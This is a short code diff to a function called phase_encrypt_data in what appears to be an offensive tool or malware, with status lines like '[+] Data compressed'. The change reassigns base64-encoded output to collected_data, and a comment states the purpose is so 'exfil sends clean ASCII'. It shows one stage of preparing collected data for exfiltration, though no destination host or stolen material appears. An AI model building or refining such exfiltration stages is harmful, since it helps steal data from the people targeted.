@@ -222,9 +222,10 @@ fn phase_encrypt_data() -> bool {
         let compressed = jocky_compress_data(collected_data, strlen(collected_data))
         println("    [+] Data compressed")
 
-        // Base64 Encoding
+        // Base64 Encoding — update collected_data so exfil sends clean ASCII, not raw binary
         let encoded = jocky_data_base64_encode(compressed, strlen(compressed))
-        println("    [+] Base64 encoded: " + string(strlen(encoded)) + " bytes")
+        collected_data = encoded
+        println("    [+] Base64 encoded: " + string(strlen(collected_data)) + " bytes")
     }
 
     println("")
